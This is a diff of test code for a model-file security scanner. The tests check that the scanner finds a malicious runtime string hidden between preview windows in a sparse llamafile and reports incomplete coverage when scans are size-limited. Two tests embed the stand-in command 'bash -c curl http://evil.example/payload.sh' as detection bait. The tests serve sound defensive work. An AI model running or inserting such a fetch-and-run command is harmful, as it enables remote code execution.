@@ -15,6 +15,7 @@ from modelaudit.scanners.llamafile_scanner import (
     LLAMAFILE_ROUTE_SCAN_BYTES,
     LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
     LLAMAFILE_RUNTIME_PREVIEW_READ_REASON,
+    LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON,
     LlamafileScanner,
     find_structural_torch7_offset,
 )
@@ -33,6 +34,18 @@ def _build_llamafile_blob(
         embedded_payload if embedded_payload is not None else b"\x00" * 8192 + b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
     )
     return header + marker + runtime + b"\x00" * 256 + payload
+
+
+def _write_sparse_runtime_gap_llamafile(path: Path, hidden_runtime: bytes) -> None:
+    file_size = 12 * 1024 * 1024
+    with path.open("wb") as handle:
+        handle.write(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56)
+        handle.seek(4 * 1024 * 1024)
+        handle.write(hidden_runtime + b"\n")
+        handle.seek(6 * 1024 * 1024)
+        handle.write(b"llamafile runtime\n")
+        handle.seek(file_size - 1)
+        handle.write(b"\x00")
 
 
 def test_llamafile_scanner_can_handle_detected_llamafile(tmp_path: Path) -> None:
@@ -110,6 +123,76 @@ def test_llamafile_scanner_flags_true_middle_runtime_strings(tmp_path: Path) -> 
     result = LlamafileScanner().scan(str(binary))
 
     assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_llamafile_scanner_streams_runtime_between_preview_windows(tmp_path: Path) -> None:
+    binary = tmp_path / "runtime-preview-gap.llamafile"
+    _write_sparse_runtime_gap_llamafile(binary, b"bash -c curl http://evil.example/payload.sh")
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata.get("analysis_incomplete") is not True
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_llamafile_scanner_keeps_fully_streamed_benign_runtime_complete(tmp_path: Path) -> None:
+    binary = tmp_path / "benign-runtime-preview-gap.llamafile"
+    _write_sparse_runtime_gap_llamafile(binary, b"benign runtime text")
+
+    result = LlamafileScanner().scan(str(binary))
+
+    high_severity = [
+        issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+    ]
+    assert high_severity == []
+    assert result.success is True
+    assert result.metadata.get("analysis_incomplete") is not True
+    assert result.bytes_scanned <= binary.stat().st_size
+
+
+def test_llamafile_scanner_marks_omitted_runtime_bytes_inconclusive(tmp_path: Path) -> None:
+    binary = tmp_path / "bounded-runtime-preview-gap.llamafile"
+    _write_sparse_runtime_gap_llamafile(binary, b"bash -c curl http://evil.example/payload.sh")
+
+    result = LlamafileScanner(config={"llamafile_payload_scan_bytes": 3 * 1024 * 1024}).scan(str(binary))
+
+    assert result.success is False
+    assert result.metadata.get("analysis_incomplete") is True
+    assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in result.metadata.get("scan_outcome_reasons", [])
+    coverage_checks = [check for check in result.checks if check.name == "Llamafile Runtime Coverage"]
+    assert len(coverage_checks) == 1
+    assert coverage_checks[0].severity == IssueSeverity.INFO
+    assert coverage_checks[0].message == "Executable runtime extends beyond the bounded streaming scan window"
+    assert coverage_checks[0].details.get("analysis_incomplete") is True
+    assert coverage_checks[0].details.get("runtime_bytes_omitted") == 9 * 1024 * 1024
+
+    aggregate = scan_model_directory_or_file(
+        str(binary),
+        llamafile_payload_scan_bytes=3 * 1024 * 1024,
+        cache_scan_results=False,
+    )
+    metadata = aggregate.file_metadata[str(binary)]
+    assert aggregate.success is False
+    assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in metadata.get("scan_outcome_reasons", [])
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "runtime-coverage-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            llamafile_payload_scan_bytes=3 * 1024 * 1024,
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        cached_metadata = cached_aggregate.file_metadata[str(binary)]
+        assert cached_aggregate.success is False
+        assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in cached_metadata.get("scan_outcome_reasons", [])
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
 
 
 def test_llamafile_scanner_does_not_route_middle_near_match_in_exe(tmp_path: Path) -> None:
